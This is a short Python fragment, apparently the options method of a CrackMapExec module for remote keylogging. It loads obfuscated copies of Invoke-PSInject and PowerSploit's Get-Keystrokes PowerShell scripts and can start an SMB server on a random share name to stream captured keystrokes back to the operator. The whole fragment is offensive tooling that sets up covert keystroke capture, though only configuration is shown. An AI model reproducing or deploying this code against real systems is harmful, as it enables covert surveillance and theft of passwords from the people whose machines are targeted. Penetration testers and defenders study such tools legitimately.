def options(self, context, module_options):
    if 'TIMEOUT' not in module_options:
        context.log.error('TIMEOUT option is required!')
        exit(1)
    self.stream = False
    self.poll = 20
    self.timeout = int(module_options['TIMEOUT'])
    if 'STREAM' in module_options:
        self.stream = bool(module_options['STREAM'])
    if 'POLL' in module_options:
        self.poll = int(module_options['POLL'])
    context.log.info('This module will not exit until CTRL-C is pressed')
    context.log.info('Keystrokes will be stored in ~/.cme/logs\n')
    self.ps_script1 = obfs_ps_script(
        'cme_powershell_scripts/Invoke-PSInject.ps1')
    self.ps_script2 = obfs_ps_script(
        'powersploit/Exfiltration/Get-Keystrokes.ps1')
    if self.stream:
        self.share_name = gen_random_string(5).upper()
        self.smb_server = CMESMBServer(context.log, self.share_name,
            context.log_folder_path)
        self.smb_server.start()
    else:
        self.file_name = gen_random_string(5)